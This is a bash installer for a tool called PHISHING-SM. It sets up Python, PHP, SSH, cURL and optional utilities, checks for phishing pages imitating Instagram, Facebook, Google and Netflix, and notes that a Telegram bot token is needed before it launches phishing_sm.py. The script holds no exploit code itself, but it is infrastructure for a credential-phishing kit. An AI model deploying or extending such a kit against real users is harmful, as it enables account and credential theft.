#!/bin/bash

# PHISHING-SM Installation Script
# Educational penetration testing tool - Authorized use only

# Colors for output
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Global variables
OS_TYPE=""
PACKAGE_MANAGER=""
INSTALL_CMD=""
PHP_VERSION=""
PYTHON_VERSION=""

print_color() {
    echo -e "${1}${2}${NC}"
}

print_banner() {
    clear
    print_color $CYAN "
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗  ║
║  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝  ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗  ║
║  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║  ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                              ║
║                         ███████╗███╗   ███╗                                 ║
║                         ██╔════╝████╗ ████║                                 ║
║                         ███████╗██╔████╔██║                                 ║
║                         ╚════██║██║╚██╔╝██║                                 ║
║                         ███████║██║ ╚═╝ ██║                                 ║
║                         ╚══════╝╚═╝     ╚═╝                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"
    print_color "${BLUE}${WHITE}" "══════════════════════════ INSTALLATION SCRIPT ══════════════════════════"
    print_color $CYAN "[+] Tool: PHISHING-SM V1"
    print_color $CYAN "[+] Version: 1.0"
    print_color $CYAN "[+] Author: @A_Y_TR"
    print_color $CYAN "[+] Channel: https://t.me/cybersecurityTemDF"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"
    print_color $YELLOW "[!] Educational and authorized penetration testing tool only"
    print_color $RED "[!] Developer not responsible for misuse"
    print_color $GREEN "[+] All rights reserved: Mohamed Abu Al-Saud"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"
    echo
}

detect_os() {
    print_color $CYAN "[+] Detecting operating system..."
    
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS_TYPE=$NAME
    elif [[ -f /etc/redhat-release ]]; then
        OS_TYPE=$(cat /etc/redhat-release)
    elif [[ "$(uname)" == "Darwin" ]]; then
        OS_TYPE="macOS"
    else
        OS_TYPE="Unknown"
    fi

    # Detect package manager
    if command -v apt-get &> /dev/null; then
        PACKAGE_MANAGER="apt"
        INSTALL_CMD="apt-get install -y"
        UPDATE_CMD="apt-get update"
    elif command -v yum &> /dev/null; then
        PACKAGE_MANAGER="yum"
        INSTALL_CMD="yum install -y"
        UPDATE_CMD="yum update -y"
    elif command -v dnf &> /dev/null; then
        PACKAGE_MANAGER="dnf"
        INSTALL_CMD="dnf install -y"
        UPDATE_CMD="dnf update -y"
    elif command -v pacman &> /dev/null; then
        PACKAGE_MANAGER="pacman"
        INSTALL_CMD="pacman -S --noconfirm"
        UPDATE_CMD="pacman -Sy"
    elif command -v apk &> /dev/null; then
        PACKAGE_MANAGER="apk"
        INSTALL_CMD="apk add"
        UPDATE_CMD="apk update"
    elif command -v brew &> /dev/null; then
        PACKAGE_MANAGER="brew"
        INSTALL_CMD="brew install"
        UPDATE_CMD="brew update"
    else
        PACKAGE_MANAGER="unknown"
    fi

    print_color $GREEN "[+] Detected OS: $OS_TYPE"
    print_color $GREEN "[+] Package manager: $PACKAGE_MANAGER"
}

check_privileges() {
    print_color $CYAN "[+] Checking installation privileges..."
    
    if [[ $EUID -eq 0 ]]; then
        print_color $GREEN "[+] Running with root privileges"
        return 0
    else
        print_color $YELLOW "[!] Running without root privileges"
        
        if [[ "$PACKAGE_MANAGER" == "apt" || "$PACKAGE_MANAGER" == "yum" || "$PACKAGE_MANAGER" == "dnf" ]]; then
            print_color $YELLOW "[!] Some packages may require sudo access"
            read -p "$(print_color $YELLOW "[?] Do you want to continue without root? (y/N): ")" -n 1 -r
            echo
            if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                print_color $RED "[-] Installation cancelled"
                exit 1
            fi
        fi
        return 1
    fi
}

update_system() {
    print_color $CYAN "[+] Updating system packages..."
    
    read -p "$(print_color $YELLOW "[?] Update system packages? (recommended) (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Skipping system update"
        return
    fi

    case $PACKAGE_MANAGER in
        "apt")
            if [[ $EUID -eq 0 ]]; then
                $UPDATE_CMD
            else
                sudo $UPDATE_CMD
            fi
            ;;
        "yum"|"dnf")
            if [[ $EUID -eq 0 ]]; then
                $UPDATE_CMD
            else
                sudo $UPDATE_CMD
            fi
            ;;
        "pacman")
            if [[ $EUID -eq 0 ]]; then
                $UPDATE_CMD
            else
                sudo $UPDATE_CMD
            fi
            ;;
        "apk")
            if [[ $EUID -eq 0 ]]; then
                $UPDATE_CMD
            else
                sudo $UPDATE_CMD
            fi
            ;;
        "brew")
            $UPDATE_CMD
            ;;
        *)
            print_color $YELLOW "[!] Cannot update system automatically"
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] System updated successfully"
    else
        print_color $RED "[-] System update failed"
    fi
}

check_python() {
    print_color $CYAN "[+] Checking Python installation..."
    
    if command -v python3 &> /dev/null; then
        PYTHON_VERSION=$(python3 --version | cut -d' ' -f2)
        print_color $GREEN "[+] Python $PYTHON_VERSION found"
        
        # Check for required Python modules
        print_color $CYAN "[+] Checking Python modules..."
        if python3 -c "import requests" &> /dev/null; then
            print_color $GREEN "[+] requests module found"
        else
            print_color $YELLOW "[-] requests module not found"
            INSTALL_PYTHON_REQUESTS=1
        fi
        
        return 0
    else
        print_color $RED "[-] Python3 not found"
        return 1
    fi
}

install_python() {
    print_color $CYAN "[+] Installing Python3..."
    
    case $PACKAGE_MANAGER in
        "apt")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD python3 python3-pip
            else
                sudo $INSTALL_CMD python3 python3-pip
            fi
            ;;
        "yum")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD python3 python3-pip
            else
                sudo $INSTALL_CMD python3 python3-pip
            fi
            ;;
        "dnf")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD python3 python3-pip
            else
                sudo $INSTALL_CMD python3 python3-pip
            fi
            ;;
        "pacman")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD python python-pip
            else
                sudo $INSTALL_CMD python python-pip
            fi
            ;;
        "apk")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD python3 py3-pip
            else
                sudo $INSTALL_CMD python3 py3-pip
            fi
            ;;
        "brew")
            $INSTALL_CMD python3
            ;;
        *)
            print_color $RED "[-] Cannot install Python automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] Python installed successfully"
        check_python
        return 0
    else
        print_color $RED "[-] Python installation failed"
        return 1
    fi
}

install_python_requests() {
    print_color $CYAN "[+] Installing Python requests module..."
    
    if command -v pip3 &> /dev/null; then
        pip3 install requests
    elif command -v pip &> /dev/null; then
        pip install requests
    else
        print_color $RED "[-] pip not found, cannot install requests"
        return 1
    fi
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] requests module installed successfully"
        return 0
    else
        print_color $RED "[-] Failed to install requests module"
        return 1
    fi
}

check_php() {
    print_color $CYAN "[+] Checking PHP installation..."
    
    if command -v php &> /dev/null; then
        PHP_VERSION=$(php --version | head -n1 | cut -d' ' -f2)
        print_color $GREEN "[+] PHP $PHP_VERSION found"
        return 0
    else
        print_color $RED "[-] PHP not found"
        return 1
    fi
}

install_php() {
    print_color $CYAN "[+] Installing PHP..."
    
    case $PACKAGE_MANAGER in
        "apt")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD php
            else
                sudo $INSTALL_CMD php
            fi
            ;;
        "yum")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD php
            else
                sudo $INSTALL_CMD php
            fi
            ;;
        "dnf")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD php
            else
                sudo $INSTALL_CMD php
            fi
            ;;
        "pacman")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD php
            else
                sudo $INSTALL_CMD php
            fi
            ;;
        "apk")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD php
            else
                sudo $INSTALL_CMD php
            fi
            ;;
        "brew")
            $INSTALL_CMD php
            ;;
        *)
            print_color $RED "[-] Cannot install PHP automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] PHP installed successfully"
        check_php
        return 0
    else
        print_color $RED "[-] PHP installation failed"
        return 1
    fi
}

check_ssh() {
    print_color $CYAN "[+] Checking SSH client..."
    
    if command -v ssh &> /dev/null; then
        print_color $GREEN "[+] SSH client found"
        return 0
    else
        print_color $RED "[-] SSH client not found"
        return 1
    fi
}

install_ssh() {
    print_color $CYAN "[+] Installing SSH client..."
    
    case $PACKAGE_MANAGER in
        "apt")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD openssh-client
            else
                sudo $INSTALL_CMD openssh-client
            fi
            ;;
        "yum"|"dnf")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD openssh-clients
            else
                sudo $INSTALL_CMD openssh-clients
            fi
            ;;
        "pacman")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD openssh
            else
                sudo $INSTALL_CMD openssh
            fi
            ;;
        "apk")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD openssh-client
            else
                sudo $INSTALL_CMD openssh-client
            fi
            ;;
        "brew")
            $INSTALL_CMD openssh
            ;;
        *)
            print_color $RED "[-] Cannot install SSH automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] SSH client installed successfully"
        return 0
    else
        print_color $RED "[-] SSH client installation failed"
        return 1
    fi
}

check_curl() {
    print_color $CYAN "[+] Checking cURL..."
    
    if command -v curl &> /dev/null; then
        print_color $GREEN "[+] cURL found"
        return 0
    else
        print_color $RED "[-] cURL not found"
        return 1
    fi
}

install_curl() {
    print_color $CYAN "[+] Installing cURL..."
    
    case $PACKAGE_MANAGER in
        "apt"|"yum"|"dnf"|"pacman"|"apk"|"brew")
            if [[ $EUID -eq 0 ]] && [[ $PACKAGE_MANAGER != "brew" ]]; then
                $INSTALL_CMD curl
            elif [[ $PACKAGE_MANAGER == "brew" ]]; then
                $INSTALL_CMD curl
            else
                sudo $INSTALL_CMD curl
            fi
            ;;
        *)
            print_color $RED "[-] Cannot install cURL automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] cURL installed successfully"
        return 0
    else
        print_color $RED "[-] cURL installation failed"
        return 1
    fi
}

check_qrencode() {
    print_color $CYAN "[+] Checking QR encode..."
    
    if command -v qrencode &> /dev/null; then
        print_color $GREEN "[+] QR encode found"
        return 0
    else
        print_color $YELLOW "[-] QR encode not found (optional)"
        return 1
    fi
}

install_qrencode() {
    print_color $CYAN "[+] Installing QR encode (optional)..."
    
    read -p "$(print_color $YELLOW "[?] Install QR encode for QR code generation? (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Skipping QR encode installation"
        return 0
    fi

    case $PACKAGE_MANAGER in
        "apt")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD qrencode
            else
                sudo $INSTALL_CMD qrencode
            fi
            ;;
        "yum"|"dnf")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD qrencode
            else
                sudo $INSTALL_CMD qrencode
            fi
            ;;
        "pacman")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD qrencode
            else
                sudo $INSTALL_CMD qrencode
            fi
            ;;
        "apk")
            if [[ $EUID -eq 0 ]]; then
                $INSTALL_CMD qrencode
            else
                sudo $INSTALL_CMD qrencode
            fi
            ;;
        "brew")
            $INSTALL_CMD qrencode
            ;;
        *)
            print_color $YELLOW "[-] Cannot install QR encode automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] QR encode installed successfully"
        return 0
    else
        print_color $YELLOW "[-] QR encode installation failed (optional)"
        return 1
    fi
}

check_tmux() {
    print_color $CYAN "[+] Checking TMUX..."
    
    if command -v tmux &> /dev/null; then
        print_color $GREEN "[+] TMUX found"
        return 0
    else
        print_color $YELLOW "[-] TMUX not found (optional)"
        return 1
    fi
}

install_tmux() {
    print_color $CYAN "[+] Installing TMUX (optional)..."
    
    read -p "$(print_color $YELLOW "[?] Install TMUX for better session management? (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Skipping TMUX installation"
        return 0
    fi

    case $PACKAGE_MANAGER in
        "apt"|"yum"|"dnf"|"pacman"|"apk"|"brew")
            if [[ $EUID -eq 0 ]] && [[ $PACKAGE_MANAGER != "brew" ]]; then
                $INSTALL_CMD tmux
            elif [[ $PACKAGE_MANAGER == "brew" ]]; then
                $INSTALL_CMD tmux
            else
                sudo $INSTALL_CMD tmux
            fi
            ;;
        *)
            print_color $YELLOW "[-] Cannot install TMUX automatically"
            return 1
            ;;
    esac
    
    if [ $? -eq 0 ]; then
        print_color $GREEN "[+] TMUX installed successfully"
        return 0
    else
        print_color $YELLOW "[-] TMUX installation failed (optional)"
        return 1
    fi
}

check_php_pages() {
    print_color $CYAN "[+] Checking for PHP phishing pages..."
    
    php_files=$(find . -maxdepth 1 -name "*.php" | wc -l)
    if [ $php_files -gt 0 ]; then
        print_color $GREEN "[+] Found $php_files PHP files in current directory"
        
        # Check for some common pages
        common_pages=("instagram.php" "facebook.php" "google.php" "netflix.php")
        found_pages=0
        
        for page in "${common_pages[@]}"; do
            if [[ -f "$page" ]]; then
                found_pages=$((found_pages + 1))
            fi
        done
        
        if [ $found_pages -gt 0 ]; then
            print_color $GREEN "[+] Found $found_pages common phishing pages"
        else
            print_color $YELLOW "[!] Common phishing pages not found, but other PHP files present"
        fi
        
        return 0
    else
        print_color $RED "[-] No PHP files found in current directory!"
        print_color $YELLOW "[!] The tool requires PHP phishing pages to function"
        print_color $YELLOW "[!] Please make sure you're in the correct directory"
        return 1
    fi
}

setup_ssh_key() {
    print_color $CYAN "[+] Checking for SSH key..."
    
    if [[ -f "id_rsa" ]]; then
        print_color $GREEN "[+] SSH key (id_rsa) found in current directory"
        chmod 600 id_rsa
        return 0
    else
        print_color $YELLOW "[!] SSH key (id_rsa) not found in current directory"
        print_color $YELLOW "[!] The script will use password authentication for SSH tunneling"
        return 1
    fi
}

create_directories() {
    print_color $CYAN "[+] Setting up directory structure..."
    
    # Create logs directory if it doesn't exist
    if [[ ! -d "logs" ]]; then
        mkdir -p logs
        print_color $GREEN "[+] Created logs directory"
    fi
    
    # Create results directory if it doesn't exist
    if [[ ! -d "results" ]]; then
        mkdir -p results
        print_color $GREEN "[+] Created results directory"
    fi
}

test_dependencies() {
    print_color $CYAN "[+] Testing dependencies..."
    
    local all_ok=0
    
    # Test Python
    if command -v python3 &> /dev/null; then
        print_color $GREEN "[✓] Python3 working"
    else
        print_color $RED "[✗] Python3 not working"
        all_ok=1
    fi
    
    # Test PHP
    if command -v php &> /dev/null; then
        print_color $GREEN "[✓] PHP working"
    else
        print_color $RED "[✗] PHP not working"
        all_ok=1
    fi
    
    # Test SSH
    if command -v ssh &> /dev/null; then
        print_color $GREEN "[✓] SSH working"
    else
        print_color $RED "[✗] SSH not working"
        all_ok=1
    fi
    
    # Test cURL
    if command -v curl &> /dev/null; then
        print_color $GREEN "[✓] cURL working"
    else
        print_color $RED "[✗] cURL not working"
        all_ok=1
    fi
    
    # Test Python requests module
    if python3 -c "import requests" &> /dev/null; then
        print_color $GREEN "[✓] Python requests module working"
    else
        print_color $RED "[✗] Python requests module not working"
        all_ok=1
    fi
    
    return $all_ok
}

show_installation_summary() {
    print_color "${GREEN}${WHITE}" "════════════════════════ INSTALLATION SUMMARY ════════════════════════"
    
    print_color $CYAN "[+] Operating System: $OS_TYPE"
    print_color $CYAN "[+] Package Manager: $PACKAGE_MANAGER"
    
    # Required dependencies
    print_color $CYAN "[+] Required Dependencies:"
    if command -v python3 &> /dev/null; then
        print_color $GREEN "    [✓] Python3: $PYTHON_VERSION"
    else
        print_color $RED "    [✗] Python3: NOT INSTALLED"
    fi
    
    if command -v php &> /dev/null; then
        print_color $GREEN "    [✓] PHP: $PHP_VERSION"
    else
        print_color $RED "    [✗] PHP: NOT INSTALLED"
    fi
    
    if command -v ssh &> /dev/null; then
        print_color $GREEN "    [✓] SSH Client: INSTALLED"
    else
        print_color $RED "    [✗] SSH Client: NOT INSTALLED"
    fi
    
    if command -v curl &> /dev/null; then
        print_color $GREEN "    [✓] cURL: INSTALLED"
    else
        print_color $RED "    [✗] cURL: NOT INSTALLED"
    fi
    
    # Optional dependencies
    print_color $CYAN "[+] Optional Dependencies:"
    if command -v qrencode &> /dev/null; then
        print_color $GREEN "    [✓] QRencode: INSTALLED"
    else
        print_color $YELLOW "    [!] QRencode: NOT INSTALLED"
    fi
    
    if command -v tmux &> /dev/null; then
        print_color $GREEN "    [✓] TMUX: INSTALLED"
    else
        print_color $YELLOW "    [!] TMUX: NOT INSTALLED"
    fi
    
    # PHP pages check
    php_files=$(find . -maxdepth 1 -name "*.php" | wc -l)
    if [ $php_files -gt 0 ]; then
        print_color $GREEN "    [✓] PHP Pages: $php_files files found"
    else
        print_color $RED "    [✗] PHP Pages: NO FILES FOUND"
    fi
    
    # SSH key check
    if [[ -f "id_rsa" ]]; then
        print_color $GREEN "    [✓] SSH Key: Found in current directory"
    else
        print_color $YELLOW "    [!] SSH Key: Not found (will use password auth)"
    fi
    
    print_color "${GREEN}${WHITE}" "════════════════════════════════════════════════════════════════════════"
}

main_installation() {
    print_banner
    
    # Check if user wants to proceed
    read -p "$(print_color $YELLOW "[?] Start PHISHING-SM installation? (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Installation cancelled"
        exit 0
    fi
    
    # Detection phase
    detect_os
    check_privileges
    
    # Update system
    update_system
    
    # Installation phase
    print_color $CYAN "[+] Starting dependency installation..."
    
    # Required dependencies
    if ! check_python; then
        install_python
    fi
    
    if [[ $INSTALL_PYTHON_REQUESTS -eq 1 ]]; then
        install_python_requests
    fi
    
    if ! check_php; then
        install_php
    fi
    
    if ! check_ssh; then
        install_ssh
    fi
    
    if ! check_curl; then
        install_curl
    fi
    
    # Optional dependencies
    if ! check_qrencode; then
        install_qrencode
    fi
    
    if ! check_tmux; then
        install_tmux
    fi
    
    # Setup phase
    check_php_pages
    setup_ssh_key
    create_directories
    
    # Verification phase
    if test_dependencies; then
        print_color $GREEN "[+] All required dependencies are working correctly!"
    else
        print_color $RED "[-] Some dependencies are not working properly"
        print_color $YELLOW "[!] The tool may not function correctly"
    fi
    
    # Summary
    show_installation_summary
    
    # Final instructions
    print_color "${BLUE}${WHITE}" "══════════════════════════ USAGE INSTRUCTIONS ═════════════════════════"
    print_color $GREEN "[+] To start the tool: python3 phishing_sm.py"
    print_color $GREEN "[+] Make sure you're in the directory containing the PHP files"
    print_color $GREEN "[+] You'll need a Telegram bot token and your Telegram ID"
    print_color $YELLOW "[!] Educational and authorized use only!"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"
    
    # Ask to start the tool
    read -p "$(print_color $YELLOW "[?] Start PHISHING-SM tool now? (y/N): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        if [[ -f "phishing_sm.py" ]]; then
            print_color $GREEN "[+] Starting PHISHING-SM tool..."
            python3 phishing_sm.py
        else
            print_color $RED "[-] phishing_sm.py not found in current directory"
            print_color $YELLOW "[!] Make sure the Python script is in the same directory as PHP files"
        fi
    else
        print_color $GREEN "[+] Installation completed successfully!"
        print_color $CYAN "[+] You can start the tool later with: python3 phishing_sm.py"
    fi
}

# Error handling
set -e

# Trap Ctrl+C
trap 'print_color $RED "\n[!] Installation interrupted"; exit 1' SIGINT

# Run main installation
main_installation
